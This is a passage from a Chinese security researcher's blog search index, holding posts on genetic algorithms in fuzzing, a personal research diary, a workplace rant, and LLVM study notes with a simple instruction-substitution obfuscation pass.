引用IDArling","link":"/2018/12/25/%E9%80%86%E5%90%91%E5%8D%8F%E4%BD%9C%E4%B9%8BIDA%E6%8F%92%E4%BB%B6IDArling/"},{"title":"遗传算法初窥","text":"0x00:读Fuzzing相关的paper的时候遇到了关于遗传算法的问题，其实AFL晒样本也是用了遗传算法，个人的话一直没去探究，正好读paper遇到了，就搜了一下，找到了一篇好文 getting-started-genetic-algorithms-python-tutorial，看完之后一下子明了，并且大呼过瘾 (好文章啊!) 0x01 : 达尔文进化论达尔文认为，生物之间存在着生存争斗，适应者生存下来，不适者则被淘汰，这就是自然的选择。生物正是通过遗传、变异和自然选择，从低级到高级，从简单到复杂，种类由少到多地进化着、发展着。 0x02 : 遗传算法简述这个算法的核心理念很简单：如果一个种群想持续发展下去，就必须不断的提高自身，去适应环境，在使用过程中会个体会产生变异，适应环境的变异会保留下来，遗传给后代，这么一代一代的筛选下来，留下来的都是最适应环境的个体。 我们拿Fuzz举例，每一个样本进去所触发的路径、执行时间都有差异，那么如何去筛选出有效的样本，从而从这些样本再次迭代出新一代样本，从而让我们的Fuzz更加有效呢？ 这时候我们需要一个评分规则（类比环境适应能力），评分越高，那么适应能力就越好，在这次样本变异中变异的部分（特性）会被保留下来，遗传给下一代。 参考AFL，它使用了路径等信息计算一个评分，评分高的样本保留（触发路径多），那么从这些样本中迭代，就容易产生更“优秀”的样本文件。 下图遗传算法的简单描述: 0x03 : 举个栗子例子来自getting-started-genetic-algorithms-python-tutorial 1. demo简述这里创建一个已知长度的密码破解程序 -。- （这不就是暴力破解吗，是的没错，但是思维方式要换一换啦） 我们针对没错输入的字符串（个体）进行评估，得到一个评分（适应环境性），这个评分指示着和正确密码的接近程度。算法如下： 1fitness score = (number of char correct) / (total number of char) 随后对输入的串进行变异（进化，进化，进化…），然后对于新一代的群体，进行评分，挑选合适的个体作为第二代，然后从第二代中迭代产生新的个体。 产生下一代的方式也很简单，比如我们有两个个体叫做Tom和Jerry，他们的后代名字的字母就从两者名字字母中取就好了。 经历上述的过程，一代一代的进化，最终一定会得到正确的密码。 2. 一点问题但是问题来了！这也是今天我在看论文时发现的一个问题-。- 123Bloating: Bloating [16] is a phenomenon that adversely affects input generation in evolutionary computing. There are two types of bloating: structural and functional bloating. 主要分为两类：Structural Bloating和Functional Bloating。 第一种主要是经过多代的迭代后，经过xx代，个体的平均规模不受控制的增长从而导致代码效率下降，后续的增长也无异于提高适应度（适应度，就是例子中的fitness）。 第二种是指在进化过程中，如果只挑选好的样本（高评分），那么你得到的样本会快速收敛在一个范围内，也就是说，你的样本的特征就趋于一个方向。对于我们这个密码破解程序，当然ok啦，但是对于Fuzz的话显然是不行的，我们需要多种多样的样本而不是趋近于某一种类型的样本。 3. 代码原文作者的代码在这里：getting-started-genetic-algorithms-python-tutorial_source_code 运行结果： 123$ python3 passwordTuto.pysolution: &quot;banana&quot; de fitness: 100.018.69589400291443 0x04 : 一点个人看法我觉得这个算法对于漏洞挖掘，无疑是增强型buff，通过合理的使用，能够有效的提升样本质量，从而提高fuzz的效率。但是文中提到的Bloating的问题，无疑也是需要去考虑然后加以干预的。 0x05 : 参考及引用 getting-started-genetic-algorithms-python-tutorial getting-started-genetic-algorithms-python-tutorial_source_code IFuzzer: An Evolutionary Interpreter Fuzzer using Genetic Programming","link":"/2018/06/03/%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95%E5%88%9D%E7%AA%A5/"},{"title":"Logs","text":"0x1337 2017-01-28大年初一还在写代码，把以前挖的坑填起来，一直想做的自动化的框架终于有点样子了，先做的能跑起来，然后再做一些优化工作把。想着是像msf那样的，几个功能分成几个模块去做，模块之间独立，然后paylod那些可以随意调用；今天只把exploit部分写了个开头，感觉总想推翻重写…这是病，先做完了再说重构的事情好了 QAQ 。 前几天入坑了Windows Kernel Exploit相关，看到了关于内核内存分配相关的资料的时候，感觉好熟悉，一下想起了之前看到linux glibc堆管理相关的资料了。有种很熟悉的感觉吧，怎么说呢，感觉再看到windows kernel内存管理部分的时候就很容易可以理解这些结构是怎么工作的，上手还是快，不过还是想写写代码调试看看，毕竟纸上得来终觉浅。 说到填坑，感觉好多啊，之前Android Sec相关；LLVM的研究也是处在挂起状态，之前是结合着代码混淆技术去学习的，自己写写pass之类的，还有就是看看OLLVM这个项目；符号执行技术的学习算是迈入正轨吧，Paper也很多。还有就是YouTube上好多不错的这些相关的视频啊 2333333 慢慢来吧，感觉都很有意思，而且越往后研究越有意思呀~ 2017-01-29框架exploit部分完成啦 -。- 哦豁看Android相关，看到Dalvk虚拟机部分的时候，看到了关于Zygote，就是虚拟机实例孵化器…然而这个单词的意思也是很有趣啊 啊哈哈哈哈哈哈哈，形象生动 233333333333333 2017-01-30纠结到底开不开源一些东西 :( 2017-02-04浪完了回来开工了 23333想明白了一些事，精力有限，贪多嚼不烂；其次就是关于重视基本功，一味地追求上层建筑是没有意义的，早晚要崩塌。那学习技术来说，想做的很多，但是你能够做好其中一两件已经很不错了，还有就是操作系统这个东西…不去把那些lab刷了感觉还是白学，知行合一吧算是。 2017-02-07mdzz啊…编译linux内核然后升级个linux，然后虚拟机就炸了硬盘没挂上…bug尝试一下添加系统调用、驱动的方式来体验一下linux kernel exploit 23333333333 2017-02-11把自己的PwnableLog这个repo整合进了一些收集的不错的脚本，稍作改动就可以玩了。啊 winafl对于GUI程序真是尴尬，发送窗口关闭消息或者循环进程检测并杀进程的思路效果都不理想…看来只有二次插桩可以用。 2017-02-17框架防御模块基本做起来了…想着先出成品再修bug/优化工作。当初瞎立flag，巧了又有点拖延症，哦豁，have fun咯。 2017-02-28挺尴尬很多东西以前没做详细的记录，只有零碎的记录和脚本…总结起来就很蛋疼。最近还是挺开心啊，有了铠甲也有了软肋，感觉多了一个努力的理由咯。 2017-03-01一个有情怀的二进制狗。 2017-03-06这是假的，那是假的，好像没什么真的了。 2017-03-10最近开始看linux kernel相关，底层真的太有趣了~linus insides这个gitbook不错，从boot开始讲，结合着看就很不错，再对应着源码，很爽。 2017-03-13肝了两天NJCTF…还是感觉太菜了 QAQ 低分题目做的慢 高分玩不动…挺可惜的reverse400，符号执行脚本都写好了，跑了几次，posixdump的是空值，怕是脚本又写的有问题，路径找到了，就是dump不对，尴尬。pwnable，简单的一些细节处理的不好，很伤，平时的积累啊，多收集libc，多动手搞事情 23333SROP开眼了，又是论文pwn，害怕…不过joker那个exp真的太黑客了，思路666好好学习把~ 比赛真的挺有意思的 XD 2017-03-22面试这几次，倍感所学知识面的狭窄，了解的很有限，而且以前掌握的一些东西没有再去看就很容易忘记一些细节(还好还有笔记…)感觉一直在被问移动安全…学习学习。经历一些比赛之后，感觉还有很多漏洞利用的trick…调试的trick，比如获取gs:0x10的值，都有待积累。 2017-03-23好多不顺利- -。想要的很简单，可是得到却那么难。 2017-03-27重头再来，一切还要继续，我不还是要接着看书学习写代码么。 2017-03-29调试分析CVE-2017-7269,发现用capstone还原shellcode挺好用的…虽然还原出来的sc并不好懂…可能是姿势有问题?汇编指令用的很奇怪…还有就是快速定位漏洞点，我想打个CC然后just in time debugger进去栈回溯看，但是效果不理想，啊啊啊 测试别的方法好了。 2017-04-01将生活带给你的柠檬版的酸楚，酿成犹如柠檬汽水般的甘甜。已经如此了，再坏也坏不到哪里去了。没有什么后路，也就无所畏惧，大步向前。 2017-05-05有时候需要反思以下自己的讲话的方式。可能是这几年接触的最多的是技术相关的朋友，圈子很小，所以大家交流的方式都是那么直接，也很直白，比如说到xxx，就会直接讲，xxx很简单的，你只要看了xxxxx就可以搞定xxxxx然后最后就可以完成xxx。 其实你反思以下，在圈外人看来呢？可能很多人看来是：mdzz 我不懂这些，你还说的有劲。 还有就是方式把，不可能一直生活在这个小圈子，总要接触很多人，所以不要总是以技术宅的思维去交流做事，有时候挺伤人咯-。- 别人为什么不问你问题，因为你总说：这个太简单了那个太简单了。 层次问题…有些问题在大佬看来很简单，在我看来就很困难…相互理解下就好了 233333 好好学习啦，多看书，修身养性，热爱生活。 2017-05-23铁三西南赛区打的挺不错，开心。 近期开始学习编译原理，三大浪漫之一 23333 人无信不足以立，对于这两天发生的事情的感受吧，又不能发火，烦。 1adac很好用，爽，这钱花的值。 还有嘛…有些时候付出不一定要回报，况且有些事情是习惯了-。- 2017-05-30孤独感。 2017-06-29自说自话的**只不过是给别人平添烦恼罢了。 2017-07-04断断续续看完了 CVE-2016-0728的分析，也搭建了环境分析。Linux kernel的UAF挺有意思。还在写使用了NFA构造的词法分析器…cpp拙计 感觉c可以做，但是后期优化出DFA的时候就拙计了。 2017-07-30实习。忙着工作的事，挺开心的，做喜欢的事，虽然感觉挺难的，不过有挑战性才更有意思。blog感觉很久不会再去更新了 2333333 昨晚和朋友聊天，被说：比起喜欢，我觉得你更需要人陪。 假的假的。 2017-08-20遇到两个不能复现的crash了，很心累。准备重写fuzz框架重新搞事了。 2017-08-24解决了之前的bug，又遇到了新的… 2017-09-26再接再厉 2017-10-27愿此间 山有木兮卿有意昨夜星辰恰似你 2017-12-302017就快过完了，我还在搞着adobe reader。花式空指针，fuzzer还在完善，各种各样的问题，觉得难又觉得不难。思路都很好玩，只是自身能力有限，啃不动。需要时间去积累。 而且就在昨天，发现自己之前漏掉了一个攻击点…简直血亏。 叹息… 2018-2-14过不过节感觉没啥区别啊-。-《自制编译器》真的是一本不可多得的好书。终于看到IR生成部分了，先把公开课关于中间代码生成的部分搞定了，再去看这本书这部分的内容，然后再去看它的代码。 有几天没去搞工作上的事了，只是看看paper和slide，感觉好咸鱼啊。 :( 最后，高老师节日快乐-。- 2018-2-28快要去学校了。工作有点进展了，还在看grinder源码，要改造，long way to go 编译原理学习中。 2018-4-29真的想吐槽。最近比赛什么玩意。 2018-6-9阅读paper，阅读源码，学习别人的思路。好好看书，想拿antlr4搞大事。 2018-8-13本来工作的第一个月开开心心，学东西也看心，爽的一批。但是八月份飞扬一开始，就TM负能量爆棚。 辣鸡飞扬，劝退系列，洗脑特么失败了。看看某司、某司、某司…哪家像你们这么搞人？耽误正常工作好吧，浪费时间好吧。 2018-11-10关于code coverage，对格式类fuzz很有意义，但是语法、脚本引擎这种靠逻辑的东西，意义似乎没那么大。工作的蛮开心，压力动力并存，希望自己能扛过去，完成蜕变。 2018-11-26天府杯结束，继续努力。给自己开了两个大坑，一个是关于文件格式，一个关于代码生成，随便一个都要做好久…更别提还有很多漏洞需要分析，短期内应该不会提交漏洞了。 2018-12-2调了一天洞，感觉猜想是正确的，但是调试下来就不对…真奇怪啊。又要从零开始疯狂搞挖掘了… 希望有点产出 2018-12-6每次和男哥聊，都感叹他思考问题的高度和角度，感觉自己思考问题很局限性，而且只看到眼前，没有做更多的、更长远的考虑:(too young啊还是 2018-12-21又病倒了，嗓子发炎了，喝水喝了好多… ddl在逼近，一定要抗住压力前进。 非工作时间的小计划也在一点点进行，看书学习什么的，加油。 努力程度真的还没到拼天赋那一步吧。 2018-12-25圣诞节快乐，这几天的病终于好转了一点点，想起周六在医院挂不上号、急诊等不到的场景，那一刻真的很想逃离北京。好消息是，因为生病，好像只睡了六小时也没什么问题，多的时间拿来看书了…逆向上终于有更好的进展了，我感觉有0day在等我了，加油。 2018-12-28 github开了个仓库，放自己挖到的洞poc以及一些收集到的poc，可能会跟上分析。 感叹，可能reader的代码真的太老了吧。。 遇到了奇葩的内存断点断不下来的情况，还没法解决。。心累 2018-12-31普通的一天，把自己的mbp擦的干干净净，新年新气象了。 新的一年，希望： 挖到更多的洞，RCE； 自己的非工作时间的Rock Lee计划顺利执行，并且能有成效； 学到更多东西，在非舒适区成长。 2019-2-1要回家了。 刚开始半年工作干的还不错，也有很多收获。 工作压力大，但是动力更大；最近搞定了一些问题，新的思路也得以实践，一切都不错。。 不过还有很多事没做啊，新fuzz框架的规范化，平台编写，与之相关的一些东西还没写完呢。。 继续加油，争取出更多的0day吧 :) 2019-2-3fuzz跑的还算稳定，需要接入更多的东西，想办法搞的通用一点，现在还是需要太多人为干预了； 今天都二十九了，还是写了点代码，做了一个poc db，把收集到的文件，按照不同的格式，做好分类， 方便日后fuzz使用。 这样的话，还需要写爬虫了，爬很多的样本下来… 2019-4-27再来一个信息泄漏就可以一套利用了，加油。 最近顺便把之前做的winafl通用模式fuzz封装起来，弄成类似libfuzzer的那种模式，提供函数，buffer，length，就可以直接fuzz ：） 加油咯。 2019-5-19调洞的样子真像cxk :( 大改了fuzzer，等一波输出了。 尝试新的挖洞思路中… 2019-8-7差不多尝试了两个月，没什么有用的产出，现有的都很鸡肋。 关键的问题：基本功。 2019-11-17xnu_build.sh真香 换了个路线了… 2019-11-23似乎之前过的太安逸了 :( 2020-6-21:) 找找节奏 gogogo","link":"/2017/01/28/%E9%97%B2%E8%A8%80%E7%A2%8E%E8%AF%AD/"},{"title":"飞扬历险记","text":"本故事纯属虚构，如有雷同，那就雷同吧。 飞之前，工作地十分开心，能感受到自己每天在进步，反正就是工作的很开心。 自从八月六号之后，一切都变了，我开始变得负能量爆棚，骂街的频率也陡然升高。 每天9点多到，晚上不知道几点才能走，最早的一次十一点四十，最晚的一次凌晨两点多。布置那么多东西，像幼儿园小朋友一样的活动，真的是没啥意义。 半个月的时间，耽误了很多工作，再次回到工作中，有些不适应吧，花了点时间去同步、适应，太蠢了这个东西。 让我情绪比较爆发的还是后几天中，一个妹子的事，过敏+上呼吸道感染，请假居然不允许，还强行让人家去脱口秀讲话，之后还说不合格，后天再来。真的是牛逼到不行。 你们是真的都不会生病，铁人，很厉害，希望你们生病的时候也能坚持坚持再坚持。 后面还发生了用手掂起人家电脑屏幕，摔的那种方式合上并收走的事，作为一个IT🐶，这个真的不能忍，问候一下他全家。 挺搞笑的一件事，实习生刚来就半个月这么陪着一起熬，最后一天结束的时候，领导说几句“感人”的话…兄弟，现实点，加班费。 最后，真的很无聊，自助难吃的一批。","link":"/2018/08/13/%E9%A3%9E%E6%89%AC%E5%8E%86%E9%99%A9%E8%AE%B0/"},{"title":"LLVM Study Log","text":"0x0. 简述刚接触LLVM的时候的记录，算是笔记吧，想从代码混淆的思路学习，学习如何写Pass，以及把自己写的Pass应用到实际的程序中。学习笔记更新中… 0x1. LLVM1.1 简介LLVM是一个编译器框架，LLVM框架提供的中间表示（IR），可以作为多种语言的后端，并且根据IR可以做语言无关的优化以及生成对应各种构架（x86,amd64,arm等）的代码。 主要分为三个部分：前端、Pass、后端 前端： 获取源码，转成IR。 Pass：做各种优化工作或者一些过程的变换工作。 后端： 生成对应平台的机器码。 123Source Code ----&gt; Frontend ----&gt; Optimizer ----&gt; Backend ----&gt; Machine Code | Pass Work Here 更多细节直接看官网 1.2 安装安装的话直接按照官方的文档去安装就可以了. 下载源码 123$ cd where-you-want-llvm-to-live$ svn co http://llvm.org/svn/llvm-project/llvm/trunk llvm$ cd where-you-want-llvm-to-live 迁移出clang 12$ cd llvm/tools$ svn co http://llvm.org/svn/llvm-project/cfe/trunk clang 运行库 123$ cd where-you-want-llvm-to-live$ cd llvm/projects$ svn co http://llvm.org/svn/llvm-project/compiler-rt/trunk compiler-rt 编译 1234$ mkdir build$ cd build$ cmake -DCMAKE_BUILD_TYPE:String=Release ../llvm/$ make -j x 就是最后编译的时候，时间会比较久，make -j x ，x给的大一点会编译的快一点。 1.3 IR1LLVM IR有三种形式，可读的文本形式(.ll)，硬盘上存储的二进制形式(.bc)，内存中的编译器检测和修改的形式。 下面编写测试代码，来看一下IR语言。 123456789101112131415#include &lt;stdio.h&gt;int test(int a,int b){ return a + b;}int main(int argc,char *argv[]){ int c = 0; c = test(4,6); printf(&quot;I got : %d \\n&quot;,c); return 0; } 编译clang -emit-llvm test.cpp -S -o test.ll得到IR 12345678910111213141516171819202122232425262728293031323334353637383940414243444546; ModuleID = 'test.cpp'source_filename = &quot;test.cpp&quot;target datalayout = &quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;target triple = &quot;x86_64-unknown-linux-gnu&quot;@.str = private unnamed_addr constant [13 x i8] c&quot;I got : %d \\0A\\00&quot;, align 1; Function Attrs: noinline nounwind uwtabledefine i32 @_Z4testii(i32, i32) #0 { %3 = alloca i32, align 4 %4 = alloca i32, align 4 store i32 %0, i32* %3, align 4 store i32 %1, i32* %4, align 4 %5 = load i32, i32* %3, align 4 %6 = load i32, i32* %4, align 4 %7 = add nsw i32 %5, %6 ret i32 %7}; Function Attrs: noinline norecurse uwtabledefine i32 @main(i32, i8**) #1 { %3 = alloca i32, align 4 %4 = alloca i32, align 4 %5 = alloca i8**, align 8 %6 = alloca i32, align 4 store i32 0, i32* %3, align 4 store i32 %0, i32* %4, align 4 store i8** %1, i8*** %5, align 8 store i32 0, i32* %6, align 4 %7 = call i32 @_Z4testii(i32 4, i32 6) store i32 %7, i32* %6, align 4 %8 = load i32, i32* %6, align 4 %9 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i32 0, i32 0), i32 %8) ret i32 0}declare i32 @printf(i8*, ...) #2attributes #0 = { noinline nounwind uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;no-frame-pointer-elim&quot;=&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-jump-tables&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; }attributes #1 = { noinline norecurse uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;no-frame-pointer-elim&quot;=&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-jump-tables&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; }attributes #2 = { &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;no-frame-pointer-elim&quot;=&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; }!llvm.ident = !{!0}!0 = !{!&quot;clang version 4.0.0 (trunk 291212)&quot;} 感觉配合着官网的文档，很容易就可以读懂，语法也很清晰明了。比如test函数 12345678910define i32 @_Z4testii(i32, i32) #0 { //@是全局标识符，%是局部标识符 %3 = alloca i32, align 4 //局部变量声明，并分配空间，4字节对齐 %4 = alloca i32, align 4 store i32 %0, i32* %3, align 4 //刚才的变量存储在 0号寄存器的位置 store i32 %1, i32* %4, align 4 //..............1号寄存器的位置 %5 = load i32, i32* %3, align 4 %6 = load i32, i32* %4, align 4 //分别载入到5号寄存器和6号寄存器的位置 %7 = add nsw i32 %5, %6 //然后相加，存到7号寄存器的位置 ret i32 %7 //返回结果（32位整数）} 弱弱的说一句…感觉好像JAVA字节码啊 更多的内容，还是官方文档 0x2. PassPass 的主要分类有以下几种。 ImmutablePass Immutable,字面意思一成不变，即这种pass不是普通的用来转换、分析的pass，他可以提供当前编译器配置的信息。这种pass不需要运行、也不改变状态、也不需要更新。 MoudlePass 从ModulePass派生表示这个pass使用整个程序作为一个单元，不可预测的顺序引用函数体，或者添加、删除函数；这种pass对子类行为并不了解，所以无法对其做优化。 CallGraphSCCPass 这种需要遍历自下而上的函数调用图。 FuncationPass 在每个函数上执行。这个pass再llvm的文档上有例子，那个hello world的例子。 LoopPass 这种再每个循环上执行，与函数中其他的循环无关；LoopPass使用嵌套顺序处理循环，外层最后处理。 RegionPass 类似LoopPass，但是在函数执行中的每个单个条目的退出区域上执行。还是嵌套顺序处理区域，即最外部的区域最后被处理。 BasicBlockPass 类似FunctionPass，但是必须一次限制它们对基本块的检查和修改范围，具体的限制见文档。 MachineFunctionPass LLVM代码生成器的一部分，在程序中的每个LLVM函数的依赖于机器的表示上执行。 根据LLVM for Grad Students文章的方式去动态使用pass。 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &quot;llvm/Pass.h&quot;#include &quot;llvm/IR/Function.h&quot;#include &quot;llvm/Support/raw_ostream.h&quot;#include &quot;llvm/IR/LegacyPassManager.h&quot;#include &quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;using namespace llvm;namespace { struct SkeletonPass : public FunctionPass { static char ID; SkeletonPass() : FunctionPass(ID) {} virtual bool runOnFunction(Function &amp;F) { errs() &lt;&lt; &quot;In a function called &quot; &lt;&lt; F.getName() &lt;&lt; &quot;!\\n&quot;; //如果是函数，输出函数名字 errs() &lt;&lt; &quot;Function body:\\n&quot;; F.dump(); //打印函数体 for (auto &amp;B : F) { errs() &lt;&lt; &quot;Basic block:\\n&quot;; //是bb块就输出这行 B.dump(); for (auto &amp;I : B) { errs() &lt;&lt; &quot;Instruction: &quot;; //指令的话就输出这行 I.dump(); } } return false; } };}char SkeletonPass::ID = 0;// Automatically enable the pass.// http://adriansampson.net/blog/clangpass.html // 注册Passstatic void registerSkeletonPass(const PassManagerBuilder &amp;, legacy::PassManagerBase &amp;PM) { PM.add(new SkeletonPass());}static RegisterStandardPasses RegisterMyPass(PassManagerBuilder::EP_EarlyAsPossible, registerSkeletonPass); CmakeList.txt文件 12345678910111213141516171819202122add_library(SkeletonPass MODULE # List your source files here. Skeleton.cpp)# Use C++11 to compile our pass (i.e., supply -std=c++11).target_compile_features(SkeletonPass PRIVATE cxx_range_for cxx_auto_type)# LLVM is (typically) built with no C++ RTTI. We need to match that;# otherwise, we'll get linker errors about missing RTTI data.set_target_properties(SkeletonPass PROPERTIES COMPILE_FLAGS &quot;-fno-rtti&quot;)# Get proper shared-library behavior (where symbols are not necessarily# resolved when the shared library is linked) on OS X.if(APPLE) set_target_properties(SkeletonPass PROPERTIES LINK_FLAGS &quot;-undefined dynamic_lookup&quot; )endif(APPLE) 编译pass 1234mkdir buildcd buildcmake ..make 然后就可以了 123456# muhe @ muhe-work in ~/Code/llvm-pass-skeleton/build on git:master x [17:10:02] $ makeScanning dependencies of target SkeletonPass[ 50%] Building CXX object skeleton/CMakeFiles/SkeletonPass.dir/Skeleton.cpp.o[100%] Linking CXX shared module libSkeletonPass.so[100%] Built target SkeletonPass 现在编写一个程序来测试这个Pass，我们的Pass可以标识出代码块和指令。 1234567891011121314151617181920#include&lt;stdio.h&gt;void func(){ printf(&quot;I am a func\\n&quot;);}int main(int argc,char*argv[]){ int i = 0; for(;i&lt;10;i++){ printf(&quot;test time : %d\\n&quot;,i); } func(); printf(&quot;Done\\n&quot;); return 0;} 现在运行这个Passclang -Xclang -load -Xclang build/skeleton/libSkeletonPass.so -c test.c 得到的结果略长，如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119# muhe @ muhe-work in ~/Code/llvm-pass-skeleton on git:master x [17:20:12] $ clang -Xclang -load -Xclang build/skeleton/libSkeletonPass.so -c test.c In a function called func!Function body:; Function Attrs: noinline nounwind uwtabledefine void @func() #0 { %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i32 0, i32 0)) ret void}Basic block: %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i32 0, i32 0)) ret voidInstruction: %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i32 0, i32 0))Instruction: ret voidIn a function called main!Function body:; Function Attrs: noinline nounwind uwtabledefine i32 @main(i32, i8**) #0 { %3 = alloca i32, align 4 %4 = alloca i32, align 4 %5 = alloca i8**, align 8 %6 = alloca i32, align 4 store i32 0, i32* %3, align 4 store i32 %0, i32* %4, align 4 store i8** %1, i8*** %5, align 8 store i32 0, i32* %6, align 4 br label %7; &lt;label&gt;:7: ; preds = %13, %2 %8 = load i32, i32* %6, align 4 %9 = icmp slt i32 %8, 10 br i1 %9, label %10, label %16; &lt;label&gt;:10: ; preds = %7 %11 = load i32, i32* %6, align 4 %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i32 0, i32 0), i32 %11) br label %13; &lt;label&gt;:13: ; preds = %10 %14 = load i32, i32* %6, align 4 %15 = add nsw i32 %14, 1 store i32 %15, i32* %6, align 4 br label %7; &lt;label&gt;:16: ; preds = %7 call void @func() %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i32 0, i32 0)) ret i32 0}Basic block: %3 = alloca i32, align 4 %4 = alloca i32, align 4 %5 = alloca i8**, align 8 %6 = alloca i32, align 4 store i32 0, i32* %3, align 4 store i32 %0, i32* %4, align 4 store i8** %1, i8*** %5, align 8 store i32 0, i32* %6, align 4 br label %7Instruction: %3 = alloca i32, align 4Instruction: %4 = alloca i32, align 4Instruction: %5 = alloca i8**, align 8Instruction: %6 = alloca i32, align 4Instruction: store i32 0, i32* %3, align 4Instruction: store i32 %0, i32* %4, align 4Instruction: store i8** %1, i8*** %5, align 8Instruction: store i32 0, i32* %6, align 4Instruction: br label %7Basic block:; &lt;label&gt;:7: ; preds = %13, %2 %8 = load i32, i32* %6, align 4 %9 = icmp slt i32 %8, 10 br i1 %9, label %10, label %16Instruction: %8 = load i32, i32* %6, align 4Instruction: %9 = icmp slt i32 %8, 10Instruction: br i1 %9, label %10, label %16Basic block:; &lt;label&gt;:10: ; preds = %7 %11 = load i32, i32* %6, align 4 %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i32 0, i32 0), i32 %11) br label %13Instruction: %11 = load i32, i32* %6, align 4Instruction: %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i32 0, i32 0), i32 %11)Instruction: br label %13Basic block:; &lt;label&gt;:13: ; preds = %10 %14 = load i32, i32* %6, align 4 %15 = add nsw i32 %14, 1 store i32 %15, i32* %6, align 4 br label %7Instruction: %14 = load i32, i32* %6, align 4Instruction: %15 = add nsw i32 %14, 1Instruction: store i32 %15, i32* %6, align 4Instruction: br label %7Basic block:; &lt;label&gt;:16: ; preds = %7 call void @func() %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i32 0, i32 0)) ret i32 0Instruction: call void @func()Instruction: %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i32 0, i32 0))Instruction: ret i32 0 一些包含关系：[Module [Function [BasicBlock [Instruction]]]] 他这篇文章后面例子还有使用Pass替换一些指令，如把add换成了mul，感兴趣可以跟着他的文章写一下。 0x3. 使用LLVM来做混淆add替换成sub指令，即add a,b换成了sub a,-b 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &quot;llvm/IR/Function.h&quot;#include &quot;llvm/Pass.h&quot;#include &quot;llvm/Support/raw_ostream.h&quot;#include &quot;llvm/IR/Intrinsics.h&quot;#include &quot;llvm/IR/Instructions.h&quot;#include &quot;llvm/IR/LegacyPassManager.h&quot;#include &quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;using namespace llvm;namespace { struct SimplePass : public FunctionPass { static char ID; // Pass identification, replacement for typeid SimplePass() : FunctionPass(ID) {} bool runOnFunction(Function &amp;F) override { Function *tmp = &amp;F; // 遍历函数中的所有基本块 for (Function::iterator bb = tmp-&gt;begin(); bb != tmp-&gt;end(); ++bb) { // 遍历基本块中的每条指令 for (BasicBlock::iterator inst = bb-&gt;begin(); inst != bb-&gt;end(); ++inst) { // 是否是add指令 if (inst-&gt;isBinaryOp()) { if (inst-&gt;getOpcode() == Instruction::Add) { return ob_add(cast&lt;BinaryOperator&gt;(inst)); } } } } return false; } // a+b === a-(-b) bool ob_add(BinaryOperator *bo) { BinaryOperator *op = NULL; if (bo-&gt;getOpcode() == Instruction::Add) { // 生成 (－b) op = BinaryOperator::CreateNeg(bo-&gt;getOperand(1), &quot;&quot;, bo); // 生成 a-(-b) op = BinaryOperator::Create(Instruction::Sub, bo-&gt;getOperand(0), op, &quot;&quot;, bo); op-&gt;setHasNoSignedWrap(bo-&gt;hasNoSignedWrap()); op-&gt;setHasNoUnsignedWrap(bo-&gt;hasNoUnsignedWrap()); // 